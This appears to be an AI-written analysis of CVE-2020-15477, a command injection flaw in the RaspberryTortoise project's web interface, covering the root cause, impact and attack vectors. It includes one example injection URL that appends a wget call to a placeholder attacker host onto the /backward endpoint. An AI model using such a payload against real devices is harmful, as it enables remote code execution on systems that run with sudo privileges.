Based on the provided information, here's an analysis of CVE-2020-15477:

**Root Cause of Vulnerability:**
The vulnerability stems from the lack of input validation in the `raspberryTortoise.js` file. Specifically, the `incomingString` parameter from HTTP requests is directly passed to the `child_process.exec` function without sanitization.

**Weaknesses/Vulnerabilities Present:**
- **Command Injection:** The primary vulnerability is a command injection flaw. Due to the lack of input sanitization of the `incomingString` parameter, an attacker can inject shell metacharacters into the URI. This enables the execution of arbitrary commands on the server.

**Impact of Exploitation:**
- **Remote Code Execution (RCE):** Successful exploitation of this vulnerability allows an attacker to execute arbitrary code on the server. This could lead to a complete compromise of the affected system.
- **Information Disclosure:**  The vulnerability can also be used for information disclosure as the attacker can execute commands to read sensitive files, etc.

**Attack Vectors:**
- **HTTP Requests:** The attack vector is through crafted HTTP GET requests to the web server. By appending shell metacharacters and commands within the parameters of the `/backward`, `/forward`, `/left`, or `/right` endpoints, an attacker can inject commands.
   - Example:  `http://<target-ip>:8080/backward?0.05;wget${IFS}<attacker-ip>/abcd`

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs network access to the vulnerable server.
- **Basic HTTP knowledge:** The attacker needs to be able to send HTTP requests.
- **Understanding of Shell Injection:** The attacker needs to understand how to craft shell commands to inject.

**Additional details from the provided content:**
- The vulnerability is present in the web interface of the RaspberryTortoise project.
- The `raspberryTortoise.js` file is the source of the issue.
- The `child_process.exec` function is misused.
- The commands can be injected into the `backward`, `forward`, `left`, and `right` URL paths.
- The server runs with `SUDO` privileges which can increase the impact.
- The provided steps to reproduce the issue are clear and easy to follow.
